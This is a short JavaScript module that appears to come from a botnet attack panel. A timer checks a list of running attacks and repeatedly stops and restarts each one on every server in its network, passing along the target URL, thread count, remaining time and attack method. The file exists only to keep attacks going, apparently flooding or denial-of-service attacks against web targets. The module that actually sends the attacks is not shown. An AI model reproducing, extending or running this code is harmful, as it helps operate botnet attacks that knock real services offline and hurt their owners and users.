const { Interval } = require('simple-scheduler-task')
const CommonData = require('../common/data')
const Botnet = require('../botnet/core')

new Interval({
    intervalTimer: 1000,
    source: async function () {
        const toRemove = [];

        await CommonData.autorestart.map(async obj => {
            obj.waiting++;
            if(obj.waiting >= obj.interval) {
                obj.waiting = 0;
                const attack = CommonData.attacks.find(x => x.uuid === obj.uuid);
                if(attack) {
                    for(const server of CommonData.servers[attack.network]) {
                        const res = await Botnet.stop(attack.id, server);
                        if(res && res.success) {
                            await Botnet.start(attack.url, attack.threads, Math.round((attack.end - Date.now()) / 1000), attack.method, attack.id, server);
                        }
                    }

                    //attack.end = Date.now() + (attack.time * 1000);
                } else {
                    toRemove.push(obj);
                }
            }
        })

        for(const z of toRemove) {
            CommonData.autorestart.splice(CommonData.autorestart.indexOf(z), 1);
        }
    }
});